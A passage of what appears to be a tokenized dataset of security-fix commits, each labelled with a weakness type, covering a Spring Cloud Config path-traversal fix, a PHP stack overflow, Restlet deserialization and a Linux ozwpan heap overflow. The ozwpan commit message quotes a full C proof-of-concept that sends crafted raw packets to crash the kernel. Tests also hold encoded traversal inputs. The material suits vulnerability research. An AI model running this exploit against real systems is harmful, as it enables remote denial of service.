"for", "(", "let", "f", "in", "checks", ")", "{", "t", ".", "equal", "(", "fs", ".", "readFileSync", "(", "basedir", "+", "'", "/'", "+", "f", ",", "'", "utf8", "'", "),", "checks", "[", "f", "]", ",", "f", ")", "t", ".", "equal", "(", "fs", ".", "statSync", "(", "basedir", "+", "'", "/'", "+", "f", ")", ".", "nlink", ",", "1", ",", "f", ")", "}", "t", ".", "end", "(", ")", "}", "t", ".", "test", "(", "'", "async", "'", ",", "t", "=", ">", "{", "const", "u", "=", "new", "Unpack", "(", "{", "cwd", ":", "basedir", "}", ")", "u", ".", "on", "(", "'", "close", "'", ",", "(", ")", "=", ">", "check", "(", "t", ")", ")", "u", ".", "end", "(", "data", ")", "}", ")", "t", ".", "test", "(", "'", "sync", "'", ",", "t", "=", ">", "{", "const", "u", "=", "new", "UnpackSync", "(", "{", "cwd", ":", "basedir", "}", ")", "u", ".", "end", "(", "data", ")", "check", "(", "t", ")", "}", ")", "t", ".", "end", "(", ")", "}", ")"], "docstring_tokens": ["file", "overwrite"]}
{"contents": ["Verifies", "resources", "are", "in", "allowed", "locations"], "code_tokens": ["@", "@", "-", "27", ",", "7", "+", "27", ",", "7", "@", "@", "<", "/", "scm", ">", "<", "properties", ">", "<", "bintray", ".", "package", ">", "config", "<", "/", "bintray", ".", "package", ">", "<", "spring", "-", "cloud", "-", "commons", ".", "version", ">", "2", ".", "1", ".", "7", ".", "BUILD", "-", "SNAPSHOT", "<", "/", "spring", "-", "cloud", "-", "commons", ".", "version", ">", "<", "spring", "-", "cloud", "-", "commons", ".", "version", ">", "2", ".", "1", ".", "6", ".", "BUILD", "-", "SNAPSHOT", "<", "/", "spring", "-", "cloud", "-", "commons", ".", "version", ">", "<", "maven", "-", "checkstyle", "-", "plugin", ".", "failsOnError", ">", "true", "<", "/", "maven", "-", "checkstyle", "-", "plugin", ".", "failsOnError", ">", "<", "maven", "-", "checkstyle", "-", "plugin", ".", "failsOnViolation", ">", "true", "@", "@", "-", "6", ",", "7", "+", "6", ",", "7", "@", "@", "<", "parent", ">", "<", "artifactId", ">", "spring", "-", "cloud", "-", "dependencies", "-", "parent", "<", "/", "artifactId", ">", "<", "groupId", ">", "org", ".", "springframework", ".", "cloud", "<", "/", "groupId", ">", "<", "version", ">", "2", ".", "1", ".", "12", ".", "BUILD", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "version", ">", "2", ".", "1", ".", "11", ".", "BUILD", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "relativePath", "/", ">", "<", "/", "parent", ">", "<", "artifactId", ">", "spring", "-", "cloud", "-", "config", "-", "dependencies", "<", "/", "artifactId", ">", "@", "@", "-", "17", ",", "6", "+", "17", ",", "7", "@", "@", "package", "org", ".", "springframework", ".", "cloud", ".", "config", ".", "server", ".", "resource", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "LinkedHashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "@", "@", "-", "56", ",", "18", "+", "57", ",", "22", "@", "@", "public", "synchronized", "Resource", "findOne", "(", "String", "application", ",", "String", "profile", ",", "String", "if", "(", "StringUtils", ".", "hasText", "(", "path", ")", ")", "{", "String", "[", "]", "locations", "=", "this", ".", "service", ".", "getLocations", "(", "application", ",", "profile", ",", "label", ")", ".", "getLocations", "(", ");", "ArrayList", "<", "Resource", ">", "locationResources", "=", "new", "ArrayList", "<", ">(", ");", "for", "(", "int", "i", "=", "locations", ".", "length", ";", "i", "-", "-", ">", "0", ";", ")", "{", "String", "location", "=", "locations", "[", "i", "]", ";", "if", "(", "!", "PathUtils", ".", "isInvalidEncodedLocation", "(", "location", ")", ")", "{", "locationResources", ".", "add", "(", "this", ".", "resourceLoader", ".", "getResource", "(", "location", ")", ");", "}", "}", "try", "{", "for", "(", "int", "i", "=", "locations", ".", "length", ";", "i", "-", "-", ">", "0", ";", ")", "{", "String", "location", "=", "locations", "[", "i", "]", ";", "if", "(", "PathUtils", ".", "isInvalidEncodedLocation", "(", "location", ")", ")", "{", "continue", ";", "}", "for", "(", "Resource", "location", ":", "locationResources", ")", "{", "for", "(", "String", "local", ":", "getProfilePaths", "(", "profile", ",", "path", ")", ")", "{", "if", "(", "!", "PathUtils", ".", "isInvalidPath", "(", "local", ")", "&", "&", "!", "PathUtils", ".", "isInvalidEncodedPath", "(", "local", ")", ")", "{", "Resource", "file", "=", "this", ".", "resourceLoader", ".", "getResource", "(", "location", ")", ".", "createRelative", "(", "local", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "isReadable", "(", "))", "{", "Resource", "file", "=", "location", ".", "createRelative", "(", "local", ")", ";", "if", "(", "file", ".", "exists", "(", ")", "&", "&", "file", ".", "isReadable", "(", ")", "&", "&", "PathUtils", ".", "checkResource", "(", "file", ",", "location", ",", "locationResources", ")", ")", "{", "return", "file", ";", "}", "}", "@", "@", "-", "16", ",", "12", "+", "16", ",", "17", "@", "@", "package", "org", ".", "springframework", ".", "cloud", ".", "config", ".", "server", ".", "support", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "net", ".", "URLDecoder", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "UrlResource", ";", "import", "org", ".", "springframework", ".", "util", ".", "ResourceUtils", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "@", "@", "-", "203", ",", "4", "+", "208", ",", "71", "@", "@", "public", "static", "boolean", "isInvalidPath", "(", "String", "path", ")", "{", "return", "false", ";", "}", "/", "**", "*", "Perform", "additional", "checks", "on", "a", "resolved", "resource", "beyond", "checking", "whether", "the", "*", "resources", "exists", "and", "is", "readable", ".", "The", "default", "implementation", "also", "verifies", "the", "*", "resource", "is", "either", "under", "the", "location", "relative", "to", "which", "it", "was", "found", "or", "is", "under", "*", "one", "of", "the", "{", "@", "link", "#", "setAllowedLocations", "allowed", "locations", "}", ".", "*", "@", "param", "resource", "the", "resource", "to", "check", "*", "@", "param", "location", "the", "location", "relative", "to", "which", "the", "resource", "was", "found", "*", "@", "param", "allowedLocations", "set", "of", "allowed", "locations", "*", "@", "return", "\"", "true", "\"", "if", "resource", "is", "in", "a", "valid", "location", ",", "\"", "false", "\"", "otherwise", ".", "*", "@", "throws", "IOException", "if", "Resource", "URLS", "fail", "to", "parse", ".", "*", "@", "since", "4", ".", "1", ".", "2", "*", "/", "public", "static", "boolean", "checkResource", "(", "Resource", "resource", ",", "Resource", "location", ",", "List", "<", "Resource", ">", "allowedLocations", ")", "throws", "IOException", "{", "if", "(", "isResourceUnderLocation", "(", "resource", ",", "location", ")", ")", "{", "return", "true", ";", "}", "if", "(", "allowedLocations", "!", "=", "null", ")", "{", "for", "(", "Resource", "current", ":", "allowedLocations", ")", "{", "if", "(", "isResourceUnderLocation", "(", "resource", ",", "current", ")", ")", "{", "return", "true", ";", "}", "}", "}", "if", "(", "logger", ".", "isWarnEnabled", "(", "))", "{", "logger", ".", "warn", "(", "\"", "Resource", "path", "\\", "\"\"", "+", "location", ".", "getURI", "(", ")", "+", "\"", "\\\"", "was", "successfully", "resolved", "\"", "+", "\"", "but", "resource", "\\", "\"\"", "+", "resource", ".", "getURL", "(", ")", "+", "\"", "\\\"", "is", "neither", "under", "the", "\"", "+", "\"", "current", "location", "\\", "\"\"", "+", "location", ".", "getURL", "(", ")", "+", "\"", "\\\"", "nor", "under", "any", "of", "the", "\"", "+", "\"", "allowed", "locations", "\"", "+", "(", "allowedLocations", "!", "=", "null", "?", "allowedLocations", ":", "\"", "[]", "\")", ");", "}", "return", "false", ";", "}", "private", "static", "boolean", "isResourceUnderLocation", "(", "Resource", "resource", ",", "Resource", "location", ")", "throws", "IOException", "{", "if", "(", "resource", ".", "getClass", "(", ")", "!", "=", "location", ".", "getClass", "(", "))", "{", "return", "false", ";", "}", "String", "resourcePath", ";", "String", "locationPath", ";", "if", "(", "resource", "instanceof", "UrlResource", ")", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "toExternalForm", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "location", ".", "getURL", "(", ").", "toString", "(", "))", ";", "}", "else", "if", "(", "resource", "instanceof", "ClassPathResource", ")", "{", "resourcePath", "=", "(", "(", "ClassPathResource", ")", "resource", ")", ".", "getPath", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "((", "ClassPathResource", ")", "location", ")", ".", "getPath", "(", "))", ";", "}", "else", "{", "resourcePath", "=", "resource", ".", "getURL", "(", ").", "getPath", "(", ");", "locationPath", "=", "StringUtils", ".", "cleanPath", "(", "location", ".", "getURL", "(", ").", "getPath", "(", "))", ";", "}", "if", "(", "locationPath", ".", "equals", "(", "resourcePath", ")", ")", "{", "return", "true", ";", "}", "locationPath", "=", "(", "locationPath", ".", "endsWith", "(", "\"/", "\")", "|", "|", "locationPath", ".", "isEmpty", "(", ")", "?", "locationPath", ":", "locationPath", "+", "\"", "/\"", ");", "return", "(", "resourcePath", ".", "startsWith", "(", "locationPath", ")", "&", "&", "!", "isInvalidEncodedPath", "(", "resourcePath", ")", ");", "}", "}", "@", "@", "-", "120", ",", "6", "+", "120", ",", "17", "@", "@", "public", "void", "invalidPathWithPreviousDirectoryAllEncoded", "(", ")", "{", "testInvalidPath", "(", "\"%", "2E", "%", "2E", "%", "2F", "\"", ");", "}", "@", "Test", "public", "void", "invalidPathEncodedSlash", "(", ")", "{", "String", "file", "=", "System", ".", "getProperty", "(", "\"", "user", ".", "dir", "\"", ");", "file", "=", "file", ".", "replaceFirst", "(", "\"\\", "\\/", "\",", "\"", "%", "2f", "\"", ");", "file", "+", "=", "\"", "/", "src", "/", "test", "/", "resources", "/", "ssh", "/", "key", "\"", ";", "this", ".", "exception", ".", "expect", "(", "NoSuchResourceException", ".", "class", ")", ";", "this", ".", "nativeRepository", ".", "setSearchLocations", "(", "\"", "file", ":", "./", "\")", ";", "this", ".", "output", ".", "expect", "(", "containsString", "(", "\"", "is", "neither", "under", "the", "current", "location", "\"", "))", ";", "this", ".", "repository", ".", "findOne", "(", "\"", "blah", "\"", ",", "\"", "local", "\"", ",", "\"", "master", "\"", ",", "file", ")", ";", "}", "private", "void", "testInvalidPath", "(", "String", "label", ")", "{", "this", ".", "exception", ".", "expect", "(", "NoSuchResourceException", ".", "class", ")", ";", "this", ".", "nativeRepository", ".", "setSearchLocations", "(", "\"", "file", ":", "./", "src", "/", "test", "/", "resources", "/", "test", "/", "local", "\"", ");"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["ozwpan:", "Use", "unsigned", "ints", "to", "prevent", "heap", "overflow", "Using", "signed", "integers,", "the", "subtraction", "between", "required_size", "and", "offset", "could", "wind", "up", "being", "negative,", "resulting", "in", "a", "memcpy", "into", "a", "heap", "buffer", "with", "a", "negative", "length,", "resulting", "in", "huge", "amounts", "of", "network-supplied", "data", "being", "copied", "into", "the", "heap,", "which", "could", "potentially", "lead", "to", "remote", "code", "execution..", "This", "is", "remotely", "triggerable", "with", "a", "magic", "packet.", "A", "PoC", "which", "obtains", "DoS", "follows", "below.", "It", "requires", "the", "ozprotocol.h", "file", "from", "this", "module.", "=-=-=-=-=-=", "#include", "<arpa/inet.h>", "#include", "<linux/if_packet.h>", "#include", "<net/if.h>", "#include", "<netinet/ether.h>", "#include", "<stdio.h>", "#include", "<string.h>", "#include", "<stdlib.h>", "#include", "<endian.h>", "#include", "<sys/ioctl.h>", "#include", "<sys/socket.h>", "#define", "u8", "uint8_t", "#define", "u16", "uint16_t", "#define", "u32", "uint32_t", "#define", "__packed", "__attribute__((__packed__))", "#include", "\"ozprotocol.h\"", "static", "int", "hex2num(char", "c)", "{", "if", "(c", ">=", "'0'", "&&", "c", "<=", "'9')", "return", "c", "-", "'0';", "if", "(c", ">=", "'a'", "&&", "c", "<=", "'f')", "return", "c", "-", "'a'", "+", "10;", "if", "(c", ">=", "'A'", "&&", "c", "<=", "'F')", "return", "c", "-", "'A'", "+", "10;", "return", "-1;", "}", "static", "int", "hwaddr_aton(const", "char", "*txt,", "uint8_t", "*addr)", "{", "int", "i;", "for", "(i", "=", "0;", "i", "<", "6;", "i++)", "{", "int", "a,", "b;", "a", "=", "hex2num(*txt++);", "if", "(a", "<", "0)", "return", "-1;", "b", "=", "hex2num(*txt++);", "if", "(b", "<", "0)", "return", "-1;", "*addr++", "=", "(a", "<<", "4)", "|", "b;", "if", "(i", "<", "5", "&&", "*txt++", "!=", "':')", "return", "-1;", "}", "return", "0;", "}", "int", "main(int", "argc,", "char", "*argv[])", "{", "if", "(argc", "<", "3)", "{", "fprintf(stderr,", "\"Usage:", "%s", "interface", "destination_mac\\n\",", "argv[0]);", "return", "1;", "}", "uint8_t", "dest_mac[6];", "if", "(hwaddr_aton(argv[2],", "dest_mac))", "{", "fprintf(stderr,", "\"Invalid", "mac", "address.\\n\");", "return", "1;", "}", "int", "sockfd", "=", "socket(AF_PACKET,", "SOCK_RAW,", "IPPROTO_RAW);", "if", "(sockfd", "<", "0)", "{", "perror(\"socket\");", "return", "1;", "}", "struct", "ifreq", "if_idx;", "int", "interface_index;", "strncpy(if_idx.ifr_ifrn.ifrn_name,", "argv[1],", "IFNAMSIZ", "-", "1);", "if", "(ioctl(sockfd,", "SIOCGIFINDEX,", "&if_idx)", "<", "0)", "{", "perror(\"SIOCGIFINDEX\");", "return", "1;", "}", "interface_index", "=", "if_idx.ifr_ifindex;", "if", "(ioctl(sockfd,", "SIOCGIFHWADDR,", "&if_idx)", "<", "0)", "{", "perror(\"SIOCGIFHWADDR\");", "return", "1;", "}", "uint8_t", "*src_mac", "=", "(uint8_t", "*)&if_idx.ifr_hwaddr.sa_data;", "struct", "{", "struct", "ether_header", "ether_header;", "struct", "oz_hdr", "oz_hdr;", "struct", "oz_elt", "oz_elt;", "struct", "oz_elt_connect_req", "oz_elt_connect_req;", "}", "__packed", "connect_packet", "=", "{", ".ether_header", "=", "{", ".ether_type", "=", "htons(OZ_ETHERTYPE),", ".ether_shost", "=", "{", "src_mac[0],", "src_mac[1],", "src_mac[2],", "src_mac[3],", "src_mac[4],", "src_mac[5]", "},", ".ether_dhost", "=", "{", "dest_mac[0],", "dest_mac[1],", "dest_mac[2],", "dest_mac[3],", "dest_mac[4],", "dest_mac[5]", "}", "},", ".oz_hdr", "=", "{", ".control", "=", "OZ_F_ACK_REQUESTED", "|", "(OZ_PROTOCOL_VERSION", "<<", "OZ_VERSION_SHIFT),", ".last_pkt_num", "=", "0,", ".pkt_num", "=", "htole32(0)", "},", ".oz_elt", "=", "{", ".type", "=", "OZ_ELT_CONNECT_REQ,", ".length", "=", "sizeof(struct", "oz_elt_connect_req)", "},", ".oz_elt_connect_req", "=", "{", ".mode", "=", "0,", ".resv1", "=", "{0},", ".pd_info", "=", "0,", ".session_id", "=", "0,", ".presleep", "=", "35,", ".ms_isoc_latency", "=", "0,", ".host_vendor", "=", "0,", ".keep_alive", "=", "0,", ".apps", "=", "htole16((1", "<<", "OZ_APPID_USB)", "|", "0x1),", ".max_len_div16", "=", "0,", ".ms_per_isoc", "=", "0,", ".up_audio_buf", "=", "0,", ".ms_per_elt", "=", "0", "}", "};", "struct", "{", "struct", "ether_header", "ether_header;", "struct", "oz_hdr", "oz_hdr;", "struct", "oz_elt", "oz_elt;", "struct", "oz_get_desc_rsp", "oz_get_desc_rsp;", "}", "__packed", "pwn_packet", "=", "{", ".ether_header", "=", "{", ".ether_type", "=", "htons(OZ_ETHERTYPE),", ".ether_shost", "=", "{", "src_mac[0],", "src_mac[1],", "src_mac[2],", "src_mac[3],", "src_mac[4],", "src_mac[5]", "},", ".ether_dhost", "=", "{", "dest_mac[0],", "dest_mac[1],", "dest_mac[2],", "dest_mac[3],", "dest_mac[4],", "dest_mac[5]", "}", "},", ".oz_hdr", "=", "{", ".control", "=", "OZ_F_ACK_REQUESTED", "|", "(OZ_PROTOCOL_VERSION", "<<", "OZ_VERSION_SHIFT),", ".last_pkt_num", "=", "0,", ".pkt_num", "=", "htole32(1)", "},", ".oz_elt", "=", "{", ".type", "=", "OZ_ELT_APP_DATA,", ".length", "=", "sizeof(struct", "oz_get_desc_rsp)", "},", ".oz_get_desc_rsp", "=", "{", ".app_id", "=", "OZ_APPID_USB,", ".elt_seq_num", "=", "0,", ".type", "=", "OZ_GET_DESC_RSP,", ".req_id", "=", "0,", ".offset", "=", "htole16(2),", ".total_size", "=", "htole16(1),", ".rcode", "=", "0,", ".data", "=", "{0}", "}", "};", "struct", "sockaddr_ll", "socket_address", "=", "{", ".sll_ifindex", "=", "interface_index,", ".sll_halen", "=", "ETH_ALEN,", ".sll_addr", "=", "{", "dest_mac[0],", "dest_mac[1],", "dest_mac[2],", "dest_mac[3],", "dest_mac[4],", "dest_mac[5]", "}", "};", "if", "(sendto(sockfd,", "&connect_packet,", "sizeof(connect_packet),", "0,", "(struct", "sockaddr", "*)&socket_address,", "sizeof(socket_address))", "<", "0)", "{", "perror(\"sendto\");", "return", "1;", "}", "usleep(300000);", "if", "(sendto(sockfd,", "&pwn_packet,", "sizeof(pwn_packet),", "0,", "(struct", "sockaddr", "*)&socket_address,", "sizeof(socket_address))", "<", "0)", "{", "perror(\"sendto\");", "return", "1;", "}", "return", "0;", "}", "Signed-off-by:", "Jason", "A.", "Donenfeld", "<Jason@zx2c4.com>", "Acked-by:", "Dan", "Carpenter", "<dan.carpenter@oracle.com>", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "746", ",", "8", "+", "746", ",", "8", "@", "@", "void", "oz_hcd_pd_reset", "(", "void", "*", "hpd", ",", "void", "*", "hport", ")", "/", "*", "*", "Context", ":", "softirq", "*", "/", "void", "oz_hcd_get_desc_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "int", "status", ",", "const", "u8", "*", "desc", ",", "int", "length", ",", "int", "offset", ",", "int", "total_size", ")", "void", "oz_hcd_get_desc_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "u8", "status", ",", "const", "u8", "*", "desc", ",", "u8", "length", ",", "u16", "offset", ",", "u16", "total_size", ")", "{", "struct", "oz_port", "*", "port", "=", "hport", ";", "struct", "urb", "*", "urb", ";", "@", "@", "-", "759", ",", "8", "+", "759", ",", "8", "@", "@", "void", "oz_hcd_get_desc_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "int", "status", ",", "const", "u8", "*", "desc", ",", "if", "(", "!", "urb", ")", "return", ";", "if", "(", "status", "=", "=", "0", ")", "{", "int", "copy_len", ";", "int", "required_size", "=", "urb", "-", ">", "transfer_buffer_length", ";", "unsigned", "int", "copy_len", ";", "unsigned", "int", "required_size", "=", "urb", "-", ">", "transfer_buffer_length", ";", "if", "(", "required_size", ">", "total_size", ")", "required_size", "=", "total_size", ";", "@", "@", "-", "29", ",", "8", "+", "29", ",", "8", "@", "@", "void", "oz_usb_request_heartbeat", "(", "void", "*", "hpd", ")", ";", "/", "*", "Confirmation", "functions", ".", "*", "/", "void", "oz_hcd_get_desc_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "int", "status", ",", "const", "u8", "*", "desc", ",", "int", "length", ",", "int", "offset", ",", "int", "total_size", ")", ";", "void", "oz_hcd_get_desc_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "u8", "status", ",", "const", "u8", "*", "desc", ",", "u8", "length", ",", "u16", "offset", ",", "u16", "total_size", ")", ";", "void", "oz_hcd_control_cnf", "(", "void", "*", "hport", ",", "u8", "req_id", ",", "u8", "rcode", ",", "const", "u8", "*", "data", ",", "int", "data_len", ")", ";"], "docstring_tokens": ["integer", "signedness"]}
{"contents": ["Fixed", "bug", "#73473:", "Stack", "Buffer", "Overflow", "in", "msgfmt_parse_message"], "code_tokens": ["@", "@", "-", "7", ",", "6", "+", "7", ",", "9", "@", "@", "PHP", "NEWS", "properties", ")", ".", "(", "Laruence", ")", ".", "Fixed", "misparsing", "of", "abstract", "unix", "domain", "socket", "names", ".", "(", "Sara", ")", "-", "Intl", ":", ".", "Fixed", "bug", "#", "73473", "(", "Stack", "Buffer", "Overflow", "in", "msgfmt_parse_message", ")", ".", "(", "libnex", ")", "-", "Mbstring", ":", ".", "Add", "oniguruma", "upstream", "fix", "(", "CVE", "-", "2017", "-", "9224", ",", "CVE", "-", "2017", "-", "9226", ",", "CVE", "-", "2017", "-", "9227", ",", "CVE", "-", "2017", "-", "9228", ",", "CVE", "-", "2017", "-", "9229", ")", "(", "Remi", ",", "Mamoru", "TASAKA", ")", "@", "@", "-", "110", ",", "6", "+", "110", ",", "7", "@", "@", "PHP_FUNCTION", "(", "msgfmt_parse_message", ")", "RETURN_FALSE", ";", "}", "INTL_CHECK_LOCALE_LEN", "(", "slocale_len", ")", ";", "memset", "(", "mfo", ",", "0", ",", "sizeof", "(", "*", "mfo", ")", ");", "msgformat_data_init", "(", "&", "mfo", "-", ">", "mf_data", ")", ";"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["Fixed", "issue", "#774", "-", "Removed", "default", "support", "of", "JavaBeans", "XML-serialization.", "Reported", "by", "David", "Jorm,", "Dinis", "Cruz,", "Abraham", "Kang", "and", "Alvaro", "Munoz."], "code_tokens": ["@", "@", "-", "12", ",", "7", "+", "12", ",", "8", "@", "@", "Changes", "log", "-", "Bug", "fixed", "-", "Fixed", "issue", "#", "739", "-", "copy", "extension", "headers", "from", "JAX", "-", "RS", "api", "to", "restlet", "response", ".", "Reported", "by", "Mark", "Kharitonov", ".", "-", "Fixed", "issue", "#", "774", "-", "Removed", "default", "support", "of", "JavaBeans", "XML", "-", "serialization", ".", "Reported", "by", "David", "Jorm", ",", "Dinis", "Cruz", ",", "Abraham", "Kang", "and", "Alvaro", "Munoz", ".", "-", "2", ".", "2", "Milestone", "3", "(", "03", "/", "07", "/", "2013", ")", "-", "Bug", "fixed", "-", "Fixed", "issue", "#", "737", "-", "ExecutorService", "not", "set", "when", "calling", "WriterRepresentation", "#", "write", ".", "@", "@", "-", "78", ",", "6", "+", "78", ",", "10", "@", "@", "private", "static", "final", "VariantInfo", "VARIANT_OBJECT_XML", "=", "new", "VariantInfo", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ")", ";", "/", "**", "Indicates", "whether", "the", "JavaBeans", "XML", "deserialization", "is", "supported", "or", "not", ".", "*", "/", "private", "static", "final", "boolean", "VARIANT_OBJECT_XML_SUPPORTED", "=", "Boolean", ".", "getBoolean", "(", "\"", "org", ".", "restlet", ".", "engine", ".", "converter", ".", "DefaultConverter", ".", "VARIANT_OBJECT_XML_SUPPORTED", "\"", ");", "@", "Override", "public", "List", "<", "Class", "<", "?>", ">", "getObjectClasses", "(", "Variant", "source", ")", "{", "List", "<", "Class", "<", "?>", ">", "result", "=", "null", ";", "@", "@", "-", "90", ",", "7", "+", "94", ",", "8", "@", "@", "MediaType", "mediaType", "=", "source", ".", "getMediaType", "(", ");", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "equals", "(", "mediaType", ")", "|", "|", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "mediaType", ")", ")", "{", "|", "|", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "mediaType", ")", "))", "{", "result", "=", "addObjectClass", "(", "result", ",", "Object", ".", "class", ")", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_WWW_FORM", ".", "equals", "(", "mediaType", ")", ")", "{", "result", "=", "addObjectClass", "(", "result", ",", "Form", ".", "class", ")", ";", "@", "@", "-", "123", ",", "7", "+", "128", ",", "9", "@", "@", "result", "=", "addVariant", "(", "result", ",", "VARIANT_FORM", ")", ";", "}", "else", "if", "(", "Serializable", ".", "class", ".", "isAssignableFrom", "(", "source", ")", ")", "{", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT", ")", ";", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT_XML", ")", ";", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", ")", "{", "result", "=", "addVariant", "(", "result", ",", "VARIANT_OBJECT_XML", ")", ";", "}", "}", "}", "@", "@", "-", "160", ",", "11", "+", "167", ",", "13", "@", "@", "public", "float", "score", "(", "Object", "source", ",", "Variant", "target", ",", "Resource", "resource", ")", "{", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "1", ".", "0F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "target", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "}", "else", "{", "@", "@", "-", "216", ",", "11", "+", "225", ",", "13", "@", "@", "public", "float", "score", "(", "Object", "source", ",", "Variant", "target", ",", "Resource", "resource", ")", "{", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "equals", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "1", ".", "0F", ";", "}", "else", "if", "(", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "}", "else", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", "&", "&", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ".", "isCompatible", "(", "source", ".", "getMediaType", "(", "))", ")", "{", "result", "=", "0", ".", "6F", ";", "}", "else", "{", "result", "=", "0", ".", "5F", ";", "@", "@", "-", "331", ",", "8", "+", "342", ",", "10", "@", "@", "public", "Representation", "toRepresentation", "(", "Object", "source", ",", "Variant", "target", ",", "}", "else", "if", "(", "Serializable", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT", ",", "1", ".", "0F", ")", ";", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ",", "1", ".", "0F", ")", ";", "if", "(", "VARIANT_OBJECT_XML_SUPPORTED", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "APPLICATION_JAVA_OBJECT_XML", ",", "1", ".", "0F", ")", ";", "}", "}", "else", "if", "(", "String", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", "|", "|", "Reader", ".", "class", ".", "isAssignableFrom", "(", "entity", ")", ")", "{", "updatePreferences", "(", "preferences", ",", "MediaType", ".", "TEXT_PLAIN", ",", "1", ".", "0F", ")", ";", "@", "@", "-", "33", ",", "6", "+", "33", ",", "8", "@", "@", "package", "org", ".", "restlet", ".", "representation", ";", "import", "java", ".", "beans", ".", "XMLDecoder", ";", "import", "java", ".", "beans", ".", "XMLEncoder", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "ObjectInputStream", ";", "@", "@", "-", "43", ",", "7", "+", "45", ",", "26", "@", "@", "import", "org", ".", "restlet", ".", "data", ".", "MediaType", ";", "/", "**", "*", "Representation", "based", "on", "a", "serializable", "Java", "object", ".", "*", "Representation", "based", "on", "a", "serializable", "Java", "object", ".", "<", "br", ">", "*", "It", "supports", "binary", "representations", "of", "JavaBeans", "using", "the", "*", "{", "@", "link", "ObjectInputStream", "}", "and", "{", "@", "link", "ObjectOutputStream", "}", "classes", ".", "In", "this", "*", "case", ",", "it", "handles", "representations", "having", "the", "following", "media", "type", ":", "*", "{", "@", "link", "MediaType", "#", "APPLICATION_JAVA_OBJECT", "}", "*", "(", "\"", "application", "/", "x", "-", "java", "-", "serialized", "-", "object", "\"", ").", "It", "also", "supports", "textual", "*", "representations", "of", "JavaBeans", "using", "the", "{", "@", "link", "XMLEncoder", "}", "and", "*", "{", "@", "link", "XMLDecoder", "}", "classes", ".", "In", "this", "case", ",", "it", "handles", "representations", "having", "*", "the", "following", "media", "type", ":", "{", "@", "link", "MediaType", "#", "APPLICATION_JAVA_OBJECT_XML", "}", 